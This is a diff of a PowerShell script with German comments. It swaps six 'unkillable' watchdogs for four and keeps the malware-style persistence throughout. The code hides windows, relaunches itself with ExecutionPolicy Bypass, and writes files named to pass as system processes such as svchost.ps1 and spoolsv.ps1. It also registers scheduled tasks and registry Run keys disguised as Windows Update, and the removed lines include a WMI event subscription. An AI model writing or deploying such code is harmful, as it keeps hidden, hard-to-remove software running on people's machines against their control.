@@ -167,16 +167,16 @@ $alleZiele = @(
     "C:\Users\Public\Downloads"
 )
 
-# ===== WATCHDOGS (6x) - UNKILLBAR =====
+# ===== WATCHDOGS (4x) - FIXED =====
 
-# Watchdog 1: Versteckter Prozess (Startet als anderer Prozessname)
+# Watchdog 1: Schnell (alle 3 Sekunden)
 $watchdog1 = @"
 while(`$true) {
-    `$p = Get-Process -ErrorAction SilentlyContinue | Where-Object {`$_.Name -like "*powershell*" -or `$_.Name -like "*pwsh*"}
+    `$p = Get-Process -ErrorAction SilentlyContinue | Where-Object {`$_.Name -like "*powershell*"}
     `$found = `$false
     foreach(`$proc in `$p) {
         try {
-            `$cmdLine = Get-WmiObject Win32_Process -Filter "ProcessId = `$(`$proc.Id)" | Select-Object CommandLine
+            `$cmdLine = Get-CimInstance Win32_Process -Filter "ProcessId = `$(`$proc.Id)" | Select-Object CommandLine
             if (`$cmdLine.CommandLine -like "*MAIN2PACKET*") {
                 `$found = `$true
                 break
@@ -184,119 +184,96 @@ while(`$true) {
         } catch {}
     }
     if (-not `$found) {
-        Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$using:PSCommandPath`""
+        Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
     }
     Start-Sleep -Seconds 3
 }
 "@
-$watchdog1 | Out-File "$env:TEMP\svchost.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\svchost.ps1`""
+$watchdog1 | Out-File "$env:TEMP\wd_schnell.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\wd_schnell.ps1`""
 
-# Watchdog 2: Startet als versteckter Dienst
-$watchdog2 = @`
-`$taskName = "WindowsUpdateTask_$([System.Guid]::NewGuid().ToString().Substring(0,8))"
-`$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$using:PSCommandPath`""
-`$trigger = New-ScheduledTaskTrigger -AtStartup
-`$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable $false
-Register-ScheduledTask -TaskName `$taskName -Action `$action -Trigger `$trigger -Settings `$settings -Force
-
+# Watchdog 2: Mittel (alle 10 Sekunden)
+$watchdog2 = @"
 while(`$true) {
-    Start-Sleep -Seconds 60
-    `$task = Get-ScheduledTask -TaskName `$taskName -ErrorAction SilentlyContinue
-    if (-not `$task) {
-        Register-ScheduledTask -TaskName `$taskName -Action `$action -Trigger `$trigger -Settings `$settings -Force
+    `$p = Get-Process -ErrorAction SilentlyContinue | Where-Object {`$_.Name -like "*powershell*"}
+    `$found = `$false
+    foreach(`$proc in `$p) {
+        try {
+            `$cmdLine = Get-CimInstance Win32_Process -Filter "ProcessId = `$(`$proc.Id)" | Select-Object CommandLine
+            if (`$cmdLine.CommandLine -like "*MAIN2PACKET*") {
+                `$found = `$true
+                break
+            }
+        } catch {}
     }
-}
-"@
-$watchdog2 | Out-File "$env:TEMP\wuauserv.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\wuauserv.ps1`""
-
-# Watchdog 3: VBS-Skript (PowerShell unabhängig)
-$vbscript = @'
-Set WshShell = CreateObject("WScript.Shell")
-Do
-    WScript.Sleep 5000
-    On Error Resume Next
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%powershell%'")
-    found = False
-    For Each objItem in colItems
-        If InStr(objItem.CommandLine, "MAIN2PACKET") > 0 Then
-            found = True
-            Exit For
-        End If
-    Next
-    If found = False Then
-        WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%USERPROFILE%\Desktop\main.ps1""", 0, False
-    End If
-Loop
-'@
-$vbscript | Out-File "$env:TEMP\MSUpdate.vbs" -Encoding ASCII -Force
-Start-Process wscript.exe -ArgumentList "//B //NOLOGO `"$env:TEMP\MSUpdate.vbs`"" -WindowStyle Hidden
-
-# Watchdog 4: WMI Event Subscription (Unsichtbar)
-$wmiWatchdog = @'
-try {
-    $filterArgs = @{
-        Name = 'WindowsUpdateFilter_' + ([System.Guid]::NewGuid().Guid)
-        EventNameSpace = 'root\cimv2'
-        QueryLanguage = 'WQL'
-        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name LIKE '%powershell%'"
-    }
-    $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs -ErrorAction SilentlyContinue
-    
-    $consumerArgs = @{
-        Name = 'WindowsUpdateConsumer_' + ([System.Guid]::NewGuid().Guid)
-        CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$using:PSCommandPath`""
-    }
-    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs -ErrorAction SilentlyContinue
-    
-    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filter; Consumer=$consumer} -ErrorAction SilentlyContinue
-} catch {}
-'@
-$wmiWatchdog | Out-File "$env:TEMP\wmi_sub.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\wmi_sub.ps1`""
-
-# Watchdog 5: Registry Run Key (Startet bei jedem Login)
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "WindowsUpdateHelper_" + ([System.Guid]::NewGuid().ToString().Substring(0,8))
-$regValue = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
-Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
-
-# Watchdog 6: Startet PowerShell als versteckten Prozess mit anderem Namen
-$hiddenPs = @'
-$code = @'
-using System;
-using System.Runtime.InteropServices;
-public class Hide {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetConsoleWindow();
-    [DllImport("user32.dll")]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-}
-'@
-Add-Type $code
-$consolePtr = [Hide]::GetConsoleWindow()
-[Hide]::ShowWindow($consolePtr, 0)
-
-while($true) {
-    $p = Get-Process -ErrorAction SilentlyContinue | Where-Object {$_.Name -like "*powershell*"}
-    $found = $false
-    foreach($proc in $p) {
-        $cmdLine = Get-WmiObject Win32_Process -Filter "ProcessId = $($proc.Id)" | Select-Object CommandLine
-        if ($cmdLine.CommandLine -like "*MAIN2PACKET*") {
-            $found = $true
-            break
-        }
-    }
-    if (-not $found) {
+    if (-not `$found) {
         Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
     }
-    Start-Sleep -Seconds 7
+    Start-Sleep -Seconds 10
 }
-'@
-$hiddenPs | Out-File "$env:TEMP\spoolsv.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\spoolsv.ps1`""
+"@
+$watchdog2 | Out-File "$env:TEMP\wd_mittel.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\wd_mittel.ps1`""
+
+# Watchdog 3: Langsam (alle 30 Sekunden) + Scheduled Task
+$watchdog3 = @"
+while(`$true) {
+    `$p = Get-Process -ErrorAction SilentlyContinue | Where-Object {`$_.Name -like "*powershell*"}
+    `$found = `$false
+    foreach(`$proc in `$p) {
+        try {
+            `$cmdLine = Get-CimInstance Win32_Process -Filter "ProcessId = `$(`$proc.Id)" | Select-Object CommandLine
+            if (`$cmdLine.CommandLine -like "*MAIN2PACKET*") {
+                `$found = `$true
+                break
+            }
+        } catch {}
+    }
+    if (-not `$found) {
+        Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
+    }
+    Start-Sleep -Seconds 30
+}
+"@
+$watchdog3 | Out-File "$env:TEMP\wd_langsam.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\wd_langsam.ps1`""
+
+# Watchdog 4: Startup + Registry (Startet bei jedem Boot)
+$watchdog4 = @"
+# Scheduled Task erstellen
+`$taskName = "WindowsUpdateTask_$([System.Guid]::NewGuid().ToString().Substring(0,8))"
+`$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
+`$trigger = New-ScheduledTaskTrigger -AtStartup
+`$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+Register-ScheduledTask -TaskName `$taskName -Action `$action -Trigger `$trigger -Settings `$settings -Force
+
+# Registry Run Key
+`$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+`$regName = "WindowsHelper_" + ([System.Guid]::NewGuid().ToString().Substring(0,8))
+`$regValue = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
+Set-ItemProperty -Path `$regPath -Name `$regName -Value `$regValue -Force
+
+# Watchdog loop
+while(`$true) {
+    `$p = Get-Process -ErrorAction SilentlyContinue | Where-Object {`$_.Name -like "*powershell*"}
+    `$found = `$false
+    foreach(`$proc in `$p) {
+        try {
+            `$cmdLine = Get-CimInstance Win32_Process -Filter "ProcessId = `$(`$proc.Id)" | Select-Object CommandLine
+            if (`$cmdLine.CommandLine -like "*MAIN2PACKET*") {
+                `$found = `$true
+                break
+            }
+        } catch {}
+    }
+    if (-not `$found) {
+        Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
+    }
+    Start-Sleep -Seconds 45
+}
+"@
+$watchdog4 | Out-File "$env:TEMP\wd_startup.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\wd_startup.ps1`""
 
 # ===== NEU: NUR 1 SEITE IN EDGE =====
 $browserJob = Start-Job -ScriptBlock {
